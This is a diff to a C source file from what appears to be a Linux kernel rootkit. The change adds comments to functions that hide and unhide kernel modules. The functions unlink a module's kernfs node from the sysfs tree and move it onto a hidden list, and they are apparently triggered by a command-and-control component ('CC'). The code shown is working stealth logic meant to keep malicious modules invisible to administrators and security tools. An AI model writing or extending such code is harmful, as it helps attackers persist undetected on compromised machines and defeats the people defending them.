@@ -1,3 +1,6 @@
+/*
+ * This file provides all the functionality needed for hiding modules.
+ */
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/kobject.h>
@@ -20,6 +23,9 @@ func* find_module1 = (func*) sysmap_find_module;
 struct mutex *mod_mutex = (struct mutex *) (sysmap_module_mutex);
 struct list_head *modules = (struct list_head *) sysmap_modules;
 
+/*
+ * Function to check if the module is hidden
+ */
 struct module* find_hidden_module(char* name)
 {
   struct module* mod;
@@ -32,6 +38,9 @@ struct module* find_hidden_module(char* name)
   return NULL;
 }
 
+/*
+ * Function to remove the module from kernel file system
+ */
 static void kernfs_remove_node(struct kernfs_node *kn)
 {
         /* rb_erase: Function defined in <rbtree.h>, Unlinks kernfs_node from sibling tree 
@@ -41,6 +50,9 @@ static void kernfs_remove_node(struct kernfs_node *kn)
         RB_CLEAR_NODE(&kn->rb);
 }
 
+/*
+ * Function to find the position, to where the module will be inserted
+ */
 int name_compare(unsigned int hash, const char *name, const void *ns, const struct kernfs_node *kn)
 {
         if(hash != kn->hash)
@@ -51,6 +63,12 @@ int name_compare(unsigned int hash, const char *name, const void *ns, const stru
 
 }
 
+/*
+ * Function to insert the module to kernel file system
+ * Note: kernfs is implemented as rb tree and there are no functions in kernel 
+ * to do this automatically. we need to search in the tree for the position to 
+ * insert then link the node and color the tree. 
+ */
 int kernfs_insert_node(struct kernfs_node *kn)
 {
       struct rb_node **node = &kn->parent->dir.children.rb_node;
@@ -89,6 +107,9 @@ int kernfs_insert_node(struct kernfs_node *kn)
         return 0;
 }
 
+/*
+ * Function to hide the module when the modules is given
+ */
 void  hide_module_bymod(struct module *mod)
 {
 	
@@ -98,6 +119,9 @@ void  hide_module_bymod(struct module *mod)
 	list_add_tail(&mod->list, &hidden_modules);
 }
 
+/*
+ * Function to un hide the module, when it's given
+ */
 void  unhide_module_bymod(struct module *mod)
 {
 
@@ -109,6 +133,10 @@ void  unhide_module_bymod(struct module *mod)
 	kernfs_insert_node(mod->mkobj.kobj.sd);
 }
 
+/*
+ * This is called from the CC, takes the module name, finds module using the kernel method
+ * find_module(name) and calls hide_module_bymod
+ */
 void hide_module_byname(char *name)
 {
         struct module *mod;
@@ -128,6 +156,10 @@ void hide_module_byname(char *name)
 
 }
 
+/*
+ * Function called from CC to unhide module.
+ * Finds the modules from hidden module list and call unhide_module_bymod
+ */
 void unhide_module_byname(char *name)
 {
 
